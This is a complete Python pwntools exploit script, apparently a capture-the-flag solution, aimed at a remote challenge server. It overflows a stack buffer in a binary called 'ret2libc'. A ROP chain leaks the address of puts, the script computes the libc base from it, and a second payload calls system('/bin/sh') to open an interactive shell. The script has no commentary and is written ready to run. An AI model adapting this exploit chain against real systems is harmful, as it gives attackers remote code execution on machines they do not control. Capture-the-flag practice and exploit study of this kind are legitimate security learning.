from pwn import *

#io = process("./ret2libc")
io = remote("node5.anna.nssctf.cn", 27968)
elf = ELF("./ret2libc")
libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = elf.sym["main"]
ret_addr = 0x40101A
pop_rdi_ = 0x401273

payload = (
    b"a" * (0x100 + 0x8)
    + p64(ret_addr)
    + p64(pop_rdi_)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(main)
)
io.sendline(payload)
io.recvuntil(b"\n")
puts_addr = u64(io.recvuntil(b"\x7f").ljust(8, b"\x00"))
print("puts address = ", hex(puts_addr))

base_libc = puts_addr - libc.sym["puts"]
print("base libc address =", hex(base_libc))
system_addr = base_libc + libc.sym["system"]
print("system address =", hex(system_addr))
binsh_addr = base_libc + next(libc.search(b"/bin/sh\x00"))
print("/bin/sh address=", hex(binsh_addr))

payload = (
    b"a" * (0x100 + 0x8)
    + p64(pop_rdi_)
    + p64(binsh_addr)
    + p64(system_addr)
)

io.sendline(payload)
io.interactive()
